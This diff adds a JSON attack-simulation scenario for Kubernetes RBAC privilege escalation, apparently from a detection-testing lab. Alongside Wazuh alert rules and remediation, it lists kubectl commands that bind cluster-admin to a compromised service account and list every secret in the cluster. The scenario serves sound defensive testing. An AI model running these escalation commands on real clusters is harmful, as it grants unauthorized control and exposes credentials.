@@ -1,0 +1,186 @@
+{
+  "id": "S4-03",
+  "name": "RBAC Misconfiguration Exploitation",
+  "category": "Kubernetes",
+  "version": "1.0",
+  "description": "Exploit overly permissive RBAC to escalate privileges in Kubernetes",
+  "difficulty": "Medium",
+  "real_world_relevance": "Common Kubernetes misconfigurations, cluster admin escalation",
+
+  "mitre_attack": {
+    "tactics": ["Privilege Escalation", "Persistence"],
+    "techniques": [
+      {"id": "T1078.001", "name": "Valid Accounts: Default Accounts"},
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["k8s-node"],
+    "network": "k8s_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker exploits RBAC misconfigurations to escalate to cluster-admin",
+    "diagram": [
+      "1. Attacker gains access with limited service account",
+      "2. Attacker enumerates RBAC permissions",
+      "3. Attacker finds privilege escalation path (create roles, impersonate)",
+      "4. Attacker creates ClusterRoleBinding to cluster-admin",
+      "5. Attacker achieves full cluster control"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Permission Enumeration",
+      "description": "Discover current RBAC permissions",
+      "actions": [
+        {
+          "type": "command",
+          "command": "kubectl auth can-i --list",
+          "expected_output_contains": ["create", "bind"]
+        },
+        {
+          "type": "command",
+          "command": "kubectl auth can-i create clusterrolebindings",
+          "description": "Check if can create cluster role bindings"
+        }
+      ]
+    },
+    {
+      "name": "Role Discovery",
+      "description": "Find existing roles and role bindings",
+      "actions": [
+        {
+          "type": "command",
+          "command": "kubectl get clusterroles -o custom-columns=NAME:.metadata.name,VERBS:.rules[*].verbs",
+          "description": "List cluster roles with verbs"
+        },
+        {
+          "type": "command",
+          "command": "kubectl get clusterrolebindings -o wide",
+          "description": "List cluster role bindings"
+        }
+      ]
+    },
+    {
+      "name": "Escalation via RoleBinding",
+      "description": "Create role binding to escalate privileges",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:compromised-sa",
+          "description": "Bind cluster-admin to compromised service account"
+        }
+      ]
+    },
+    {
+      "name": "Verify Escalation",
+      "description": "Confirm cluster-admin access",
+      "actions": [
+        {
+          "type": "command",
+          "command": "kubectl auth can-i '*' '*'",
+          "expected_output_contains": ["yes"]
+        },
+        {
+          "type": "command",
+          "command": "kubectl get secrets -A",
+          "description": "List all secrets across cluster"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Audit Log",
+      "description": "ClusterRoleBinding creation events",
+      "wazuh_rule": "100756"
+    },
+    {
+      "type": "Audit Log",
+      "description": "Role binding to cluster-admin",
+      "wazuh_rule": "100757"
+    },
+    {
+      "type": "Audit Log",
+      "description": "kubectl auth can-i enumeration",
+      "wazuh_rule": "100758"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100756",
+      "level": 12,
+      "description": "NHI: ClusterRoleBinding created - potential privilege escalation"
+    },
+    {
+      "rule_id": "100757",
+      "level": 15,
+      "description": "NHI: cluster-admin binding created - CRITICAL"
+    },
+    {
+      "rule_id": "100758",
+      "level": 6,
+      "description": "NHI: RBAC permission enumeration detected"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Delete unauthorized role bindings",
+      "Review and revoke excessive permissions",
+      "Enable Kubernetes audit logging"
+    ],
+    "long_term": [
+      "Implement least privilege RBAC",
+      "Use namespace isolation",
+      "Deploy OPA Gatekeeper for policy enforcement",
+      "Regular RBAC audits with tools like rbac-police"
+    ],
+    "secure_rbac": {
+      "apiVersion": "rbac.authorization.k8s.io/v1",
+      "kind": "Role",
+      "metadata": {"name": "app-role", "namespace": "production"},
+      "rules": [
+        {
+          "apiGroups": [""],
+          "resources": ["configmaps"],
+          "verbs": ["get", "list"],
+          "resourceNames": ["app-config"]
+        }
+      ]
+    },
+    "opa_policy": "# Deny cluster-admin bindings\npackage kubernetes.admission\n\ndeny[msg] {\n  input.request.kind.kind == \"ClusterRoleBinding\"\n  input.request.object.roleRef.name == \"cluster-admin\"\n  msg := \"ClusterRoleBinding to cluster-admin is not allowed\"\n}"
+  },
+
+  "demo_script": {
+    "container": "k8s-node",
+    "commands": [
+      "# Check current permissions",
+      "kubectl auth can-i --list 2>/dev/null | head -20",
+      "",
+      "# Check if can escalate",
+      "kubectl auth can-i create clusterrolebindings 2>/dev/null || echo 'Cannot escalate (good!)'"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Kubernetes RBAC",
+      "url": "https://kubernetes.io/docs/reference/access-authn-authz/rbac/"
+    },
+    {
+      "title": "RBAC Privilege Escalation",
+      "url": "https://kubernetes.io/docs/concepts/security/rbac-good-practices/"
+    },
+    {
+      "title": "rbac-police Tool",
+      "url": "https://github.com/PaloAltoNetworks/rbac-police"
+    }
+  ]
+}
